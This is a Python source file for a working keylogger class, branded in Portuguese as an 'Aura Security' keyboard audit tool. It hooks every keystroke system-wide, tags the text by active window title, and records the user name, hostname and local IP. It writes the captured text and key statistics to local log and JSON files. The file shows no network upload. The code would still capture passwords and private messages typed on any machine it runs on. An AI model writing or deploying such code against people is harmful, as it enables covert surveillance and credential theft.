import getpass
import json
import os
import platform
import socket
import subprocess
import threading
import time
from datetime import datetime

from pynput import keyboard
from core.reporting import format_report_header_text


class KeyloggerEngine:
    def __init__(self, log_dir, flush_size=25, flush_interval=10, user_context=None):
        self.log_dir = log_dir
        self.flush_size = flush_size
        self.flush_interval = flush_interval
        self.user_context = user_context

        self.buffer = ""
        self.line_buffer = []
        self.log_file = None

        self.listener = None
        self.last_window = None
        self._cached_window = "Unknown"
        self._last_window_check = 0

        self.shift_pressed = False
        self.caps_lock_state = False
        self.last_key_time = time.time()

        self.stats = {
            "total_keys": 0,
            "backspaces": 0,
            "enters": 0,
            "top_keys": {},
        }

        self._lock = threading.Lock()
        self._state_lock = threading.Lock()
        self._running = False
        self._flush_thread = None

    @property
    def is_running(self):
        with self._state_lock:
            return self._running

    def _set_running(self, value):
        with self._state_lock:
            self._running = value

    def _get_ip(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect(("8.8.8.8", 80))
            ip = sock.getsockname()[0]
            sock.close()
            return ip
        except Exception:
            return "0.0.0.0"

    def _get_system_info(self):
        return {
            "user": getpass.getuser(),
            "hostname": socket.gethostname(),
            "ip": self._get_ip(),
            "os": f"{platform.system()} {platform.release()}",
        }

    def _get_active_window(self):
        now = time.time()
        if now - self._last_window_check < 1:
            return self._cached_window

        self._last_window_check = now
        try:
            if platform.system() == "Linux":
                root_id = subprocess.check_output(["xprop", "-root", "_NET_ACTIVE_WINDOW"], stderr=subprocess.DEVNULL).decode().split()[-1]
                window_title = subprocess.check_output(["xprop", "-id", root_id, "WM_NAME"], stderr=subprocess.DEVNULL).decode()
                self._cached_window = window_title.split('"')[1] if '"' in window_title else "Desktop"
            else:
                self._cached_window = "Generic Window"
        except Exception:
            self._cached_window = "Unknown"

        return self._cached_window

    def _on_press(self, key):
        if not self.is_running:
            return

        self.last_key_time = time.time()

        if key in [keyboard.Key.shift, keyboard.Key.shift_r]:
            self.shift_pressed = True
            return

        if key == keyboard.Key.caps_lock:
            self.caps_lock_state = not self.caps_lock_state
            return

        current_window = self._get_active_window()
        self.stats["total_keys"] += 1

        with self._lock:
            if current_window != self.last_window:
                self._flush_line_buffer()
                self.last_window = current_window
                ts = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
                self.buffer += f"\n\n[EVENTO: TROCA DE JANELA | {ts}]\n[JANELA: {current_window}]\n> "

            try:
                char = None

                if hasattr(key, "char") and key.char:
                    char = key.char.upper() if self.shift_pressed != self.caps_lock_state else key.char.lower()
                elif key == keyboard.Key.space:
                    char = " "
                elif key == keyboard.Key.backspace:
                    self.stats["backspaces"] += 1
                    if self.line_buffer:
                        self.line_buffer.pop()
                elif key == keyboard.Key.enter:
                    self.stats["enters"] += 1
                    self.line_buffer.append("\n")
                    self._flush_line_buffer()
                elif key in [keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
                    char = "[CTRL]"
                elif key in [keyboard.Key.alt, keyboard.Key.alt_l, keyboard.Key.alt_r]:
                    char = "[ALT]"
                elif key == keyboard.Key.tab:
                    char = "[TAB]"
                elif key == keyboard.Key.esc:
                    char = "[ESC]"

                if char:
                    self.line_buffer.append(char)
                    self.stats["top_keys"][char] = self.stats["top_keys"].get(char, 0) + 1

            except Exception as exc:
                print(f"[Keylogger] erro: {exc}")

    def _on_release(self, key):
        if key in [keyboard.Key.shift, keyboard.Key.shift_r]:
            self.shift_pressed = False

    def _flush_line_buffer(self):
        if self.line_buffer:
            self.buffer += "".join(self.line_buffer)
            self.line_buffer = []
            if len(self.buffer) >= self.flush_size:
                self._flush_buffer()

    def _flush_buffer(self):
        if not self.buffer or not self.log_file:
            return

        try:
            with open(self.log_file, "a", encoding="utf-8") as file_obj:
                file_obj.write(self.buffer)
                file_obj.flush()
                os.fsync(file_obj.fileno())
            self.buffer = ""
        except Exception as exc:
            print(f"[Keylogger] erro ao gravar: {exc}")

    def _flush_worker(self):
        while self.is_running:
            time.sleep(self.flush_interval)

            if time.time() - self.last_key_time > 5:
                with self._lock:
                    self._flush_line_buffer()
                    self.buffer += "\n[SESSÃO ENCERRADA - INATIVIDADE]\n"

            with self._lock:
                self._flush_line_buffer()
                self._flush_buffer()

    def start(self):
        if self.is_running:
            return self.log_file

        os.makedirs(self.log_dir, exist_ok=True)
        info = self._get_system_info()

        filename = f"audit_{info['user']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.log_file = os.path.join(self.log_dir, filename)

        header = (
            "==========================================================\n"
            + format_report_header_text("RELATÓRIO DE AUDITORIA DE TECLADO", self.user_context)
            +
            "             AURA SECURITY - RELATÓRIO DE AUDITORIA       \n"
            "==========================================================\n"
            f"DATA/HORA INÍCIO   : {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n"
            f"USUÁRIO SISTEMA    : {info['user']}\n"
            f"ESTAÇÃO TRABALHO   : {info['hostname']} ({info['ip']})\n"
            f"SISTEMA OPERACIONAL: {info['os']}\n"
            "==========================================================\n\n"
        )

        with open(self.log_file, "w", encoding="utf-8") as file_obj:
            file_obj.write(header)

        self._set_running(True)
        self.listener = keyboard.Listener(on_press=self._on_press, on_release=self._on_release)
        self.listener.start()

        self._flush_thread = threading.Thread(target=self._flush_worker, daemon=True)
        self._flush_thread.start()

        return self.log_file

    def stop(self):
        if not self.is_running:
            return

        self._set_running(False)

        if self.listener:
            self.listener.stop()
            self.listener.join(timeout=2)

        with self._lock:
            self._flush_line_buffer()

            top_3 = sorted(self.stats["top_keys"].items(), key=lambda item: item[1], reverse=True)[:3]
            resumo = (
                "\n\n==========================================================\n"
                f"FIM DA AUDITORIA    : {datetime.now().strftime('%H:%M:%S')}\n"
                f"TOTAL DE TECLAS     : {self.stats['total_keys']}\n"
                f"ENTERS / BACKSPACES : {self.stats['enters']} / {self.stats['backspaces']}\n"
                f"TECLAS MAIS USADAS  : {top_3}\n"
                "==========================================================\n"
            )

            self.buffer += resumo
            self._flush_buffer()

        json_path = self.log_file.replace(".txt", ".json")
        try:
            with open(json_path, "w", encoding="utf-8") as file_obj:
                json.dump(self.stats, file_obj, indent=4)
        except Exception as exc:
            print(f"[Keylogger] erro ao salvar JSON: {exc}")

    def get_recent_activity(self, max_chars=1000):
        if not self.log_file or not os.path.exists(self.log_file):
            return ""
        try:
            with open(self.log_file, "r", encoding="utf-8") as file_obj:
                content = file_obj.read()
            return content[-max_chars:]
        except Exception:
            return ""

    def get_stats_report(self):
        top_3 = sorted(self.stats["top_keys"].items(), key=lambda item: item[1], reverse=True)[:3]
        return {
            "total_keys": self.stats["total_keys"],
            "enters": self.stats["enters"],
            "backspaces": self.stats["backspaces"],
            "top_keys": top_3,
            "running": self.is_running,
        }